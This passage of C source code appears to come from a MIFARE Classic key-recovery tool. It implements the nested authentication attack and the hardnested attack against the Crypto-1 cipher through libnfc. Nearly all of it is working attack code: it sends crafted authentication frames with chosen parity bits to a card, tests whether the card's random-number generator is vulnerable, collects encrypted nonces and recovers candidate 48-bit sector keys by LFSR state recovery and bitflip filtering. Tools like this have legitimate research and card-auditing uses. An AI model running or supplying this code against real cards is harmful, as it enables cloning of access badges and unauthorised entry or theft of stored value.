            nonces[i].sum_a8_guess[j].num_states = estimated_num_states_coarse(sums[first_byte_Sum], sums[nonces[i].sum_a8_guess[j].sum_a8_idx]);
            nonces[i].expected_num_brute_force += nonces[i].sum_a8_guess[j].prob * (float) nonces[i].sum_a8_guess[j].num_states / 2.0;
            prob_all_failed -= nonces[i].sum_a8_guess[j].prob;
            nonces[i].expected_num_brute_force += prob_all_failed * (float) nonces[i].sum_a8_guess[j].num_states / 2.0;
        }
    }

    // sort based on expected number of states to brute force
    qsort(best_first_bytes, 256, 1, compare_expected_num_brute_force);

    // refine scores for the best:
    for (uint16_t i = 0; i < NUM_REFINES; i++) {
        uint16_t first_byte = best_first_bytes[i];
        for (uint8_t j = 0; j < NUM_SUMS && nonces[first_byte].sum_a8_guess[j].prob > 0.05; j++) {
            nonces[first_byte].sum_a8_guess[j].num_states = estimated_num_states(first_byte, sums[first_byte_Sum], sums[nonces[first_byte].sum_a8_guess[j].sum_a8_idx]);
        }

        float prob_all_failed = 1.0;
        nonces[first_byte].expected_num_brute_force = 0.0;
        for (uint8_t j = 0; j < NUM_SUMS; j++) {
            nonces[first_byte].expected_num_brute_force += nonces[first_byte].sum_a8_guess[j].prob * (float)nonces[first_byte].sum_a8_guess[j].num_states / 2.0;
            prob_all_failed -= nonces[first_byte].sum_a8_guess[j].prob;
            nonces[first_byte].expected_num_brute_force += prob_all_failed * (float)nonces[first_byte].sum_a8_guess[j].num_states / 2.0;
        }
    }

    // copy best byte to front:
    float least_expected_brute_force = (1LL << 48);
    uint8_t best_byte = 0;
    for (uint16_t i = 0; i < 10; i++) {
        uint16_t first_byte = best_first_bytes[i];
        if (nonces[first_byte].expected_num_brute_force < least_expected_brute_force) {
            least_expected_brute_force = nonces[first_byte].expected_num_brute_force;
            best_byte = i;
        }
    }
    if (best_byte != 0) {
        uint8_t tmp = best_first_bytes[0];
        best_first_bytes[0] = best_first_bytes[best_byte];
        best_first_bytes[best_byte] = tmp;
    }
    return nonces[best_first_bytes[0]].expected_num_brute_force;
}


static float update_reduction_rate(float last, bool init) {
    static float queue[QUEUE_LEN];

    for (uint16_t i = 0; i < QUEUE_LEN - 1; i++) {
        if (init) {
            queue[i] = (float)(1LL << 48);
        } else {
            queue[i] = queue[i + 1];
        }
    }
    if (init) {
        queue[QUEUE_LEN - 1] = (float)(1LL << 48);
    } else {
        queue[QUEUE_LEN - 1] = last;
    }

    // linear regression
    float avg_y = 0.0;
    float avg_x = 0.0;
    for (uint16_t i = 0; i < QUEUE_LEN; i++) {
        avg_x += i;
        avg_y += queue[i];
    }
    avg_x /= QUEUE_LEN;
    avg_y /= QUEUE_LEN;

    float dev_xy = 0.0;
    float dev_x2 = 0.0;
    for (uint16_t i = 0; i < QUEUE_LEN; i++) {
        dev_xy += (i - avg_x) * (queue[i] - avg_y);
        dev_x2 += (i - avg_x) * (i - avg_x);
    }

    float reduction_rate = -1.0 * dev_xy / dev_x2;  // the negative slope of the linear regression

    return reduction_rate;
}


static bool shrink_key_space(float *brute_forces) {
    float brute_forces1 = check_smallest_bitflip_bitarrays();
    float brute_forces2 = (float)(1LL << 47);
    if (hardnested_stage & CHECK_2ND_BYTES) {
        brute_forces2 = sort_best_first_bytes();
    }
    *brute_forces = MIN(brute_forces1, brute_forces2);
    float reduction_rate = update_reduction_rate(*brute_forces, false);

    return ((hardnested_stage & CHECK_2ND_BYTES) &&
            reduction_rate >= 0.0 &&
            (reduction_rate < brute_force_per_second * (float)sample_period / 1000.0  || *brute_forces < 0xF00000));
}


static void estimate_sum_a8(void) {
    if (first_byte_num == 256) {
        for (uint16_t i = 0; i < 256; i++) {
            if (nonces[i].sum_a8_guess_dirty) {
                for (uint16_t j = 0; j < NUM_SUMS; j++) {
                    uint16_t sum_a8_idx = nonces[i].sum_a8_guess[j].sum_a8_idx;
                    nonces[i].sum_a8_guess[j].prob = sum_probability(sum_a8_idx, nonces[i].num, nonces[i].Sum);
                }
                qsort(nonces[i].sum_a8_guess, NUM_SUMS, sizeof(guess_sum_a8_t), compare_sum_a8_guess);
                nonces[i].sum_a8_guess_dirty = false;
            }
        }
    }
}


static noncelistentry_t *SearchFor2ndByte(uint8_t b1, uint8_t b2) {
    noncelistentry_t *p = nonces[b1].first;
    while (p != NULL) {
        if ((p->nonce_enc >> 16 & 0xff) == b2) {
            return p;
        }
        p = p->next;
    }
    return NULL;
}


static bool timeout(void) {
    return (msclock() > last_sample_clock + sample_period);
}

static void
#ifdef __has_attribute
#if __has_attribute(force_align_arg_pointer)
__attribute__((force_align_arg_pointer))
#endif
#endif
* check_for_BitFlipProperties_thread(void *args) {
    uint8_t first_byte = ((uint8_t *) args)[0];
    uint8_t last_byte = ((uint8_t *) args)[1];
    uint8_t time_budget = ((uint8_t *) args)[2];

    if (hardnested_stage & CHECK_1ST_BYTES) {
        for (uint16_t bitflip_idx = 0; bitflip_idx < num_1st_byte_effective_bitflips; bitflip_idx++) {
            uint16_t bitflip = all_effective_bitflip[bitflip_idx];
            if (time_budget & timeout()) {  
                return NULL;
            }
            for (uint16_t i = first_byte; i <= last_byte; i++) {
                if (nonces[i].BitFlips[bitflip] == 0 && nonces[i].BitFlips[bitflip ^ 0x100] == 0
                        && nonces[i].first != NULL && nonces[i ^ (bitflip & 0xff)].first != NULL) {
                    uint8_t parity1 = (nonces[i].first->par_enc) >> 3;                  // parity of first byte
                    uint8_t parity2 = (nonces[i ^ (bitflip & 0xff)].first->par_enc) >> 3; // parity of nonce with bits flipped
                    if ((parity1 == parity2 && !(bitflip & 0x100))          // bitflip
                            || (parity1 != parity2 && (bitflip & 0x100))) {     // not bitflip
                        nonces[i].BitFlips[bitflip] = 1;
                        for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
                            if (get_bitflip_data(odd_even, bitflip) != NULL) {
                                uint32_t old_count = nonces[i].num_states_bitarray[odd_even];
                                nonces[i].num_states_bitarray[odd_even] = COUNT_BITARRAY_AND(nonces[i].states_bitarray[odd_even], get_bitflip_data(odd_even, bitflip));
                                if (nonces[i].num_states_bitarray[odd_even] != old_count) {
                                    nonces[i].all_bitflips_dirty[odd_even] = true;
                                }
                            } 
                            remove_bitflip_data(odd_even, bitflip);
                        }
                    }
                }
            }
            ((uint8_t *) args)[1] = num_1st_byte_effective_bitflips - bitflip_idx - 1; // bitflips still to go in stage 1
        }
    }
    ((uint8_t *) args)[1] = 0; // stage 1 definitely completed

    if (hardnested_stage & CHECK_2ND_BYTES) {
        for (uint16_t bitflip_idx = num_1st_byte_effective_bitflips; bitflip_idx < num_all_effective_bitflips; bitflip_idx++) {
            uint16_t bitflip = all_effective_bitflip[bitflip_idx];
            if (time_budget & timeout()) {
                return NULL;
            }
            for (uint16_t i = first_byte; i <= last_byte; i++) {
                // Check for Bit Flip Property of 2nd bytes
                if (nonces[i].BitFlips[bitflip] == 0) {
                    for (uint16_t j = 0; j < 256; j++) { // for each 2nd Byte
                        noncelistentry_t *byte1 = SearchFor2ndByte(i, j);
                        noncelistentry_t *byte2 = SearchFor2ndByte(i, j^(bitflip & 0xff));
                        if (byte1 != NULL && byte2 != NULL) {
                            uint8_t parity1 = byte1->par_enc >> 2 & 0x01; // parity of 2nd byte
                            uint8_t parity2 = byte2->par_enc >> 2 & 0x01; // parity of 2nd byte with bits flipped
                            if ((parity1 == parity2 && !(bitflip & 0x100)) // bitflip
                                    || (parity1 != parity2 && (bitflip & 0x100))) { // not bitflip
                                nonces[i].BitFlips[bitflip] = 1;
                                for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
                                    if (get_bitflip_data(odd_even, bitflip) != NULL) {
                                        uint32_t old_count = nonces[i].num_states_bitarray[odd_even];
                                        nonces[i].num_states_bitarray[odd_even] = COUNT_BITARRAY_AND(nonces[i].states_bitarray[odd_even], get_bitflip_data(odd_even, bitflip));
                                        if (nonces[i].num_states_bitarray[odd_even] != old_count) {
                                            nonces[i].all_bitflips_dirty[odd_even] = true;
                                        }
                                    }
                                    remove_bitflip_data(odd_even, bitflip);
                                }
                                break;
                            }
                        }
                    }
                }
            }
        }
    }
    return NULL;
}


static void check_for_BitFlipProperties(bool time_budget) {
    // create and run worker threads
    uint8_t num_core = num_CPUs();
    pthread_t* thread_id = (pthread_t*)malloc(sizeof(pthread_t) * num_core);
    uint8_t** args = malloc(num_core * sizeof(*args));
    for (uint8_t i = 0; i < num_core; i++)
        args[i] = (uint8_t*)malloc(3 *sizeof(*args[0]));

    uint16_t bytes_per_thread = (256 + (num_core / 2)) / num_core;
    for (uint8_t i = 0; i < num_core; i++) {
          args[i][0] = i * bytes_per_thread;
          args[i][1] = MIN(args[i][0] + bytes_per_thread - 1, 255);
          args[i][2] = time_budget;
    }

    // start threads
    for (uint8_t i = 0; i < num_core; i++) {
        pthread_create(&thread_id[i], NULL, check_for_BitFlipProperties_thread, args[i]);
    }

    // wait for threads to terminate:
    for (uint8_t i = 0; i < num_core; i++) {
        pthread_join(thread_id[i], NULL);
    }
    free(thread_id);

    if (hardnested_stage & CHECK_2ND_BYTES) {
        hardnested_stage &= ~CHECK_1ST_BYTES; // we are done with 1st stage, except...
        for (uint16_t i = 0; i < num_core; i++) {
            if (args[i][1] != 0) {
                hardnested_stage |= CHECK_1ST_BYTES; // ... when any of the threads didn't complete in time
                break;
            }
        }
    }

    for (uint8_t i = 0; i < num_core; i++)
            free(args[i]);
    free(args);
}


static void update_nonce_data(bool time_budget) {
    check_for_BitFlipProperties(time_budget);
    update_allbitflips_array();
    update_sum_bitarrays(EVEN_STATE);
    update_sum_bitarrays(ODD_STATE);
    update_p_K();
    estimate_sum_a8();
}


static void apply_sum_a0(void) {
    uint32_t old_count = num_all_bitflips_bitarray[EVEN_STATE];
    num_all_bitflips_bitarray[EVEN_STATE] = COUNT_BITARRAY_AND(all_bitflips_bitarray[EVEN_STATE], sum_a0_bitarrays[EVEN_STATE][first_byte_Sum]);
    if (num_all_bitflips_bitarray[EVEN_STATE] != old_count) {
        all_bitflips_bitarray_dirty[EVEN_STATE] = true;
    }
    old_count = num_all_bitflips_bitarray[ODD_STATE];
    num_all_bitflips_bitarray[ODD_STATE] = COUNT_BITARRAY_AND(all_bitflips_bitarray[ODD_STATE], sum_a0_bitarrays[ODD_STATE][first_byte_Sum]);
    if (num_all_bitflips_bitarray[ODD_STATE] != old_count) {
        all_bitflips_bitarray_dirty[ODD_STATE] = true;
    }
}

static int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d, pKeys *pk, char mode, bool dumpKeysA, uint32_t *NtEncBytes, uint8_t* parBits)
{
  struct Crypto1State *pcs;
  struct Crypto1State *revstate;
  struct Crypto1State *revstate_start;

  uint64_t lfsr;

  // Possible key counter, just continue with a previous "session"
  uint32_t kcount = pk->size;

  uint8_t Nr[4] = { 0x00, 0x00, 0x00, 0x00 }; // Reader nonce
  uint8_t Auth[4] = { 0x00, t.sectors[e_sector].trailer, 0x00, 0x00 };
  uint8_t AuthEnc[4] = { 0x00, t.sectors[e_sector].trailer, 0x00, 0x00 };
  
  if (mode == 'h') {
    memset(Auth, 0, 4);
    memset(AuthEnc, 0, 4);
  }
  
  uint8_t AuthEncPar[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

  uint8_t ArEnc[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  uint8_t ArEncPar[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

  uint8_t Rx[MAX_FRAME_LEN]; // Tag response
  uint8_t RxPar[MAX_FRAME_LEN]; // Tag response

  uint32_t Nt, NtLast, NtProbe, NtEnc, Ks1;

  int res;
  uint32_t m, i;
  uint8_t pbits = 0, p;

  // Prepare AUTH command
  Auth[0] = (t.sectors[e_sector].foundKeyA) ? MC_AUTH_A : MC_AUTH_B;
  if (mode == 'h') {
    Auth[1] = sector_to_block(e_sector); //block
  }
  iso14443a_crc_append(Auth, 2);
  //fprintf(stdout, "\nMode: %c, Auth command:\t", mode);
  //print_hex(Auth, 4);

  // We need full control over the CRC
  if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, false) < 0)  {
    nfc_perror(r.pdi, "nfc_device_set_property_bool crc");
    exit(EXIT_FAILURE);
  }

  // Request plain tag-nonce
  // TODO: Set NP_EASY_FRAMING option only once if possible
  if (nfc_device_set_property_bool(r.pdi, NP_EASY_FRAMING, false) < 0) {
    nfc_perror(r.pdi, "nfc_device_set_property_bool framing");
    exit(EXIT_FAILURE);
  }

  if ((res = nfc_initiator_transceive_bytes(r.pdi, Auth, 4, Rx, sizeof(Rx), 0)) < 0) {
    fprintf(stdout, "Error while requesting plain tag-nonce, %d\n", res);
    exit(EXIT_FAILURE);
  }

  if (nfc_device_set_property_bool(r.pdi, NP_EASY_FRAMING, true) < 0) {
    nfc_perror(r.pdi, "nfc_device_set_property_bool");
    exit(EXIT_FAILURE);
  }
  //print_hex(Rx, res);

  // Save the tag nonce (Nt)
  Nt = bytes_to_num(Rx, res);

  // Init the cipher with key {0..47} bits
  if (t.sectors[e_sector].foundKeyA) {
    pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyA, 6));
  } else {
    pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyB, 6));
  }

  // Load (plain) uid^nt into the cipher {48..79} bits
  crypto1_word(pcs, bytes_to_num(Rx, res) ^ t.authuid, 0);

  // Generate (encrypted) nr+parity by loading it into the cipher
  for (i = 0; i < 4; i++) {
    // Load in, and encrypt the reader nonce (Nr)
    ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
    ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
  }
  // Skip 32 bits in the pseudo random generator
  Nt = prng_successor(Nt, 32);
  // Generate reader-answer from tag-nonce
  for (i = 4; i < 8; i++) {
    // Get the next random byte
    Nt = prng_successor(Nt, 8);
    // Encrypt the reader-answer (Nt' = suc2(Nt))
    ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^(Nt & 0xff);
    ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
  }

  // Finally we want to send arbitrary parity bits
  if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, false) < 0) {
    nfc_perror(r.pdi, "nfc_device_set_property_bool parity");
    exit(EXIT_FAILURE);
  }

  // Transmit reader-answer
  //fprintf(stdout, "\t{Ar}:\t");
  //print_hex_par(ArEnc, 64, ArEncPar);
  if (((res = nfc_initiator_transceive_bits(r.pdi, ArEnc, 64, ArEncPar, Rx, sizeof(Rx), RxPar)) < 0) || (res != 32)) {
    printf("Reader-answer transfer error, exiting..\n");
    exit(EXIT_FAILURE);
  }

  // Now print the answer from the tag
  //fprintf(stdout, "\t{At}:\t");
  //print_hex_par(Rx,res,RxPar);

  // Decrypt the tag answer and verify that suc3(Nt) is At
  Nt = prng_successor(Nt, 32);
  if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt & 0xFFFFFFFF))) {
    printf("[At] is not Suc3(Nt), something is wrong, exiting..\n");
    exit(EXIT_FAILURE);
  }
  //fprintf(stdout, "Authentication completed.\n\n");

  // If we are in "Get Distances" mode
  if (mode == 'd') {
    for (m = 0; m < d->num_distances; m++) {
      fprintf(stdout, "Nested Auth number: %x\n", m);
      // Encrypt Auth command with the current keystream
      for (i = 0; i < 4; i++) {
        AuthEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ Auth[i];
        // Encrypt the parity bits with the 4 plaintext bytes
        AuthEncPar[i] = filter(pcs->odd) ^ oddparity(Auth[i]);
      }

      fprintf(stdout, "\t{AuthEnc}:\t");
      print_hex_par(AuthEnc, 64, AuthEncPar);

      // Sending the encrypted Auth command
      if ((res = nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar, Rx, sizeof(Rx), RxPar)) < 0) {
        fprintf(stdout, "Error requesting encrypted tag-nonce\n");
        exit(EXIT_FAILURE);
      }

      fprintf(stdout, "\t{AuthEnResp}:\t");
      print_hex_par(Rx,res,RxPar);

      // Decrypt the encrypted auth
      if (t.sectors[e_sector].foundKeyA) {
        pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyA, 6));
      } else {
        pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyB, 6));
      }
      NtLast = bytes_to_num(Rx, 4) ^ crypto1_word(pcs, bytes_to_num(Rx, 4) ^ t.authuid, 1);

      // Make sure the card is using the known PRNG
      if (! validate_prng_nonce(NtLast)) {
           printf("Card is not vulnerable to nested attack\n");
           return -99999;
      }
      // Save the determined nonces distance
      d->distances[m] = nonce_distance(Nt, NtLast);

      // Again, prepare and send {At}
      for (i = 0; i < 4; i++) {
        ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
        ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
      }
      Nt = prng_successor(NtLast, 32);
      for (i = 4; i < 8; i++) {
        Nt = prng_successor(Nt, 8);
        ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^(Nt & 0xFF);
        ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
      }
      nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, false);

      // Transmit reader-answer
      fprintf(stdout, "\t{Ar}:\t");
      print_hex_par(ArEnc, 64, ArEncPar);

      if (((res = nfc_initiator_transceive_bits(r.pdi, ArEnc, 64, ArEncPar, Rx, sizeof(Rx), RxPar)) < 0) || (res != 32)) {
        printf("Reader-answer transfer error, exiting..\n");
        exit(EXIT_FAILURE);
      }
      Nt = prng_successor(Nt, 32);
      if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt & 0xFFFFFFFF))) {
        printf("[At] is not Suc3(Nt), something is wrong, exiting..\n");
        exit(EXIT_FAILURE);
      }

        // Now print the answer from the tag
        fprintf(stdout, "\t{At}:\t");
        print_hex_par(Rx,res,RxPar);
    } // Next auth probe

    // Find median from all distances
    d->median = median(*d);
    fprintf(stdout, "Median: %05d\n", d->median);
  } // The end of Get Distances mode

  // If we are in "Get Recovery" mode
  if (mode == 'r') {
    // Again, prepare the Auth command with MC_AUTH_A, recover the block and CRC
    Auth[0] = dumpKeysA ? MC_AUTH_A : MC_AUTH_B;
    Auth[1] = a_sector;
    iso14443a_crc_append(Auth, 2);

    // Encryption of the Auth command, sending the Auth command
    for (i = 0; i < 4; i++) {
      AuthEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ Auth[i];
      // Encrypt the parity bits with the 4 plaintext bytes
      AuthEncPar[i] = filter(pcs->odd) ^ oddparity(Auth[i]);
    }
    if (nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar, Rx, sizeof(Rx), RxPar) < 0) {
      printf("while requesting encrypted tag-nonce\n");
      exit(EXIT_FAILURE);
    }

    // Finally we want to send arbitrary parity bits
    if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, true) < 0)  {
      nfc_perror(r.pdi, "nfc_device_set_property_bool parity restore M");
      exit(EXIT_FAILURE);
    }

    if (nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, true) < 0)  {
      nfc_perror(r.pdi, "nfc_device_set_property_bool crc restore M");
      exit(EXIT_FAILURE);
    }

    // Save the encrypted nonce
    NtEnc = bytes_to_num(Rx, 4);

    // Parity validity check
    for (i = 0; i < 3; ++i) {
      d->parity[i] = (oddparity(Rx[i]) != RxPar[i]);
    }

    // Iterate over Nt-x, Nt+x
    fprintf(stdout, "Iterate from %d to %d\n", d->median-d->tolerance, d->median+d->tolerance);
    NtProbe = prng_successor(Nt, d->median - d->tolerance);
    for (m = d->median - d->tolerance; m <= d->median + d->tolerance; m += 2) {

      // Try to recover the keystream1
      Ks1 = NtEnc ^ NtProbe;

      // Skip this nonce after invalid 3b parity check
      revstate_start = NULL;
      if (valid_nonce(NtProbe, NtEnc, Ks1, d->parity)) {
        // And finally recover the first 32 bits of the key
        revstate = lfsr_recovery32(Ks1, NtProbe ^ t.authuid);
        if (revstate_start == NULL) {
          revstate_start = revstate;
        }
        while ((revstate->odd != 0x0) || (revstate->even != 0x0)) {
          lfsr_rollback_word(revstate, NtProbe ^ t.authuid, 0);
          crypto1_get_lfsr(revstate, &lfsr);
          // Allocate a new space for keys
          if (((kcount % MEM_CHUNK) == 0) || (kcount >= pk->size)) {
            pk->size += MEM_CHUNK;
            fprintf(stdout, "New chunk by %d, sizeof %llu\n", kcount, pk->size * sizeof(uint64_t));
            pk->possibleKeys = (uint64_t *) realloc((void *)pk->possibleKeys, pk->size * sizeof(uint64_t));
            if (pk->possibleKeys == NULL) {
              printf("Memory allocation error for pk->possibleKeys\n");
              exit(EXIT_FAILURE);
            }
          }
          pk->possibleKeys[kcount] = lfsr;
          kcount++;
          revstate++;
        }
        free(revstate_start);
      }
      NtProbe = prng_successor(NtProbe, 2);
    }
    // Truncate
    if (kcount != 0) {
      pk->size = --kcount;
      if ((pk->possibleKeys = (uint64_t *) realloc((void *)pk->possibleKeys, pk->size * sizeof(uint64_t))) == NULL) {
        printf("Memory allocation error for pk->possibleKeys\n");
        exit(EXIT_FAILURE);
      }
    }
  }

  if (mode == 'h') {
    // Again, prepare the Auth command with MC_AUTH_A, recover the block and CRC
    Auth[0] = dumpKeysA ? MC_AUTH_A : MC_AUTH_B;
    Auth[1] = a_sector * 4; //block
    iso14443a_crc_append(Auth, 2);

    // Encryption of the Auth command, sending the Auth command
    for (i = 0; i < 4; i++) {
        AuthEnc[i] = crypto1_byte(pcs, 0, 0) ^ Auth[i];
        // Encrypt the parity bits with the 4 plaintext bytes
        AuthEncPar[i] = filter(pcs->odd) ^ oddparity(Auth[i]);
    }
    if ((( res = nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar, Rx, sizeof (Rx), RxPar)) < 0) || (res != 32)){
        printf("while requesting encrypted tag-nonce\n");
        exit(EXIT_FAILURE);
    }
    
    // Save the encrypted nonce
    NtEnc = bytes_to_num(Rx, 4);
      
    for (i = 0; i < 4; i++) {
        p = oddparity(Rx[i]);
        if (RxPar[i] != oddparity(Rx[i])) {
            p ^= 1;
        }
        pbits <<= 1;
        pbits |= p;
    }
    *NtEncBytes = NtEnc;
    *parBits = pbits;
      
  }
  
  crypto1_destroy(pcs);
  return 0;
}

static bool acquire_nonces(uint8_t blockNo, uint8_t keyType, uint8_t *key, uint8_t trgBlockNo, uint8_t trgKeyType) {
    last_sample_clock = msclock();
    sample_period = 2000; // initial rough estimate. Will be refined.
    hardnested_stage = CHECK_1ST_BYTES;
    bool acquisition_completed = false;
    float brute_force;
    bool reported_suma8 = false;

    num_acquired_nonces = 0;

    int e_sector = block_to_sector(blockNo);
    int a_sector = block_to_sector(trgBlockNo);
    pKeys pk = {NULL, 0};
    bool dumpKeysA = (trgKeyType == MC_AUTH_A ? true : false);
    //            
    uint32_t enc_bytes = 0;
    uint8_t parbits = 0;
    do {
        nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, true);
        nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, true);
        mf_enhanced_auth(e_sector, a_sector, t, r, 0, &pk, 'h', dumpKeysA, &enc_bytes, &parbits);
        
        if (!mf_configure(r.pdi))
            return false;
        if (!mf_anticollision(t, r))
            return false;
        
        num_acquired_nonces += add_nonce(enc_bytes, parbits);
        if (first_byte_num == 256) {
            if (hardnested_stage == CHECK_1ST_BYTES) {
                for (uint16_t i = 0; i < NUM_SUMS; i++) {
                    if (first_byte_Sum == sums[i]) {
                        first_byte_Sum = i;
                        break;
                    }
                }
                hardnested_stage |= CHECK_2ND_BYTES;
                apply_sum_a0();
            }
            update_nonce_data(true);
            acquisition_completed = shrink_key_space(&brute_force);
            if (!reported_suma8) {
                char progress_string[80];
                sprintf(progress_string, "Apply Sum property. Sum(a0) = %d", sums[first_byte_Sum]);
                hardnested_print_progress(num_acquired_nonces, progress_string, brute_force, 0, trgBlockNo, trgKeyType, true);
                reported_suma8 = true;
            } else {
                hardnested_print_progress(num_acquired_nonces, "Apply bit flip properties", brute_force, 0, trgBlockNo, trgKeyType, false);
            }
        } else {
            update_nonce_data(true);
            acquisition_completed = shrink_key_space(&brute_force);
            hardnested_print_progress(num_acquired_nonces, "Apply bit flip properties", brute_force, 0, trgBlockNo, trgKeyType, false);
        }

        if (msclock() - last_sample_clock < sample_period) {
            sample_period = msclock() - last_sample_clock;
        }
        last_sample_clock = msclock();
    } while (!acquisition_completed);
    nfc_device_set_property_bool(r.pdi, NP_HANDLE_CRC, true);
    nfc_device_set_property_bool(r.pdi, NP_HANDLE_PARITY, true);
    return true;
}


static inline bool invariant_holds(uint_fast8_t byte_diff, uint_fast32_t state1, uint_fast32_t state2, uint_fast8_t bit, uint_fast8_t state_bit) {
    uint_fast8_t j_1_bit_mask = 0x01 << (bit - 1);
    uint_fast8_t bit_diff = byte_diff & j_1_bit_mask; // difference of (j-1)th bit
    uint_fast8_t filter_diff = filter(state1 >> (4 - state_bit)) ^ filter(state2 >> (4 - state_bit)); // difference in filter function
    uint_fast8_t mask_y12_y13 = 0xc0 >> state_bit;
    uint_fast8_t state_bits_diff = (state1 ^ state2) & mask_y12_y13; // difference in state bits 12 and 13
    uint_fast8_t all_diff = evenparity8(bit_diff ^ state_bits_diff ^ filter_diff); // use parity function to XOR all bits
    return !all_diff;
}


static inline bool invalid_state(uint_fast8_t byte_diff, uint_fast32_t state1, uint_fast32_t state2, uint_fast8_t bit, uint_fast8_t state_bit) {
    uint_fast8_t j_bit_mask = 0x01 << bit;
    uint_fast8_t bit_diff = byte_diff & j_bit_mask; // difference of jth bit
    uint_fast8_t mask_y13_y16 = 0x48 >> state_bit;
    uint_fast8_t state_bits_diff = (state1 ^ state2) & mask_y13_y16; // difference in state bits 13 and 16
    uint_fast8_t all_diff = evenparity8(bit_diff ^ state_bits_diff); // use parity function to XOR all bits
    return all_diff;
}


static inline bool remaining_bits_match(uint_fast8_t num_common_bits, uint_fast8_t byte_diff, uint_fast32_t state1, uint_fast32_t state2, odd_even_t odd_even) {
    if (odd_even) {
        // odd bits
        switch (num_common_bits) {
            case 0: if (!invariant_holds(byte_diff, state1, state2, 1, 0)) return true;
            case 1: if (invalid_state(byte_diff, state1, state2, 1, 0)) return false;
            case 2: if (!invariant_holds(byte_diff, state1, state2, 3, 1)) return true;
            case 3: if (invalid_state(byte_diff, state1, state2, 3, 1)) return false;
            case 4: if (!invariant_holds(byte_diff, state1, state2, 5, 2)) return true;
            case 5: if (invalid_state(byte_diff, state1, state2, 5, 2)) return false;
            case 6: if (!invariant_holds(byte_diff, state1, state2, 7, 3)) return true;
            case 7: if (invalid_state(byte_diff, state1, state2, 7, 3)) return false;
        }
    } else {
        // even bits
        switch (num_common_bits) {
            case 0: if (invalid_state(byte_diff, state1, state2, 0, 0)) return false;
            case 1: if (!invariant_holds(byte_diff, state1, state2, 2, 1)) return true;
            case 2: if (invalid_state(byte_diff, state1, state2, 2, 1)) return false;
            case 3: if (!invariant_holds(byte_diff, state1, state2, 4, 2)) return true;
            case 4: if (invalid_state(byte_diff, state1, state2, 4, 2)) return false;
            case 5: if (!invariant_holds(byte_diff, state1, state2, 6, 3)) return true;
            case 6: if (invalid_state(byte_diff, state1, state2, 6, 3)) return false;
        }
    }
    return true; // valid state
}


static struct sl_cache_entry {
    uint32_t *sl;
    uint32_t len;
    work_status_t cache_status;
} sl_cache[NUM_PART_SUMS][NUM_PART_SUMS][2];


static void init_statelist_cache(void) {
    // create mutexes for accessing the statelist cache and our "book of work"
    pthread_mutex_lock(&statelist_cache_mutex);
    for (uint16_t i = 0; i < NUM_PART_SUMS; i++) {
        for (uint16_t j = 0; j < NUM_PART_SUMS; j++) {
            for (uint16_t k = 0; k < 2; k++) {
                sl_cache[i][j][k].sl = NULL;
                sl_cache[i][j][k].len = 0;
                sl_cache[i][j][k].cache_status = TO_BE_DONE;
            }
        }
    }
    pthread_mutex_unlock(&statelist_cache_mutex);
}


static void free_statelist_cache(void) {
    pthread_mutex_lock(&statelist_cache_mutex);
    for (uint16_t i = 0; i < NUM_PART_SUMS; i++) {
        for (uint16_t j = 0; j < NUM_PART_SUMS; j++) {
            for (uint16_t k = 0; k < 2; k++) {
                free(sl_cache[i][j][k].sl);
            }
        }
    }
    pthread_mutex_unlock(&statelist_cache_mutex);
}


static inline bool bitflips_match(uint8_t byte, uint32_t state, odd_even_t odd_even, bool quiet) {
    uint32_t *bitset = nonces[byte].states_bitarray[odd_even];
    bool possible = test_bit24(bitset, state);
    if (!possible) {
        if (!quiet && known_target_key != -1 && state == test_state[odd_even]) {
            printf("Initial state lists: %s test state eliminated by bitflip property.\n", odd_even == EVEN_STATE ? "even" : "odd");
            sprintf(failstr, "Initial %s Byte Bitflip property", odd_even == EVEN_STATE ? "even" : "odd");
        }
        return false;
    }
    return true;
}


static uint_fast8_t reverse(uint_fast8_t b) {
    return (b * 0x0202020202ULL & 0x010884422010ULL) % 1023;
}


static bool all_bitflips_match(uint8_t byte, uint32_t state, odd_even_t odd_even) {
    uint32_t masks[2][8] = {
        {0x00fffff0, 0x00fffff8, 0x00fffff8, 0x00fffffc, 0x00fffffc, 0x00fffffe, 0x00fffffe, 0x00ffffff},
        {0x00fffff0, 0x00fffff0, 0x00fffff8, 0x00fffff8, 0x00fffffc, 0x00fffffc, 0x00fffffe, 0x00fffffe}
    };

    for (uint16_t i = 1; i < 256; i++) {
        uint_fast8_t bytes_diff = reverse(i); // start with most common bits
        uint_fast8_t byte2 = byte ^ bytes_diff;
        uint_fast8_t num_common = trailing_zeros(bytes_diff);
